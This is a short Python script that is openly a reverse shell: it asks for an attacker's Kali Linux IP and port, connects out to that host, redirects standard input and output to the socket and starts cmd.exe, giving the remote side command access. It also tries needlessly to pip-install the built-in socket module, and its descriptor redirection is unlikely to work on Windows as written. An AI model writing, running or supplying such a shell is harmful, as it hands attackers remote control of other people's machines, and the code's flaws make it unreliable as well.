import socket
import subprocess
import os
import sys

# Function to install missing libraries
def install_dependencies():
    try:
        import pip
    except ImportError:
        print("Pip not found. Installing pip...")
        subprocess.check_call([sys.executable, '-m', 'ensurepip', '--upgrade'])
    
    required_libraries = ['socket']
    
    for lib in required_libraries:
        try:
            __import__(lib)
        except ImportError:
            print(f"{lib} is missing. Installing...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', lib])

# Reverse shell function
def reverse_shell(attacker_ip, attacker_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the attacker machine
        s.connect((attacker_ip, attacker_port))

        # Redirect stdin, stdout, and stderr to the socket
        os.dup2(s.fileno(), 0)  # stdin
        os.dup2(s.fileno(), 1)  # stdout
        os.dup2(s.fileno(), 2)  # stderr

        # Start a command shell
        subprocess.call(['cmd.exe'])

    except socket.error as err:
        print(f"Connection error: {err}")
        s.close()

# Main function
if __name__ == "__main__":
    install_dependencies()

    # Prompt the user for the Kali Linux IP and port
    attacker_ip = input("Enter the IP address of the Kali Linux machine: ")
    attacker_port = int(input("Enter the port number (e.g., 4444): "))

    reverse_shell(attacker_ip, attacker_port)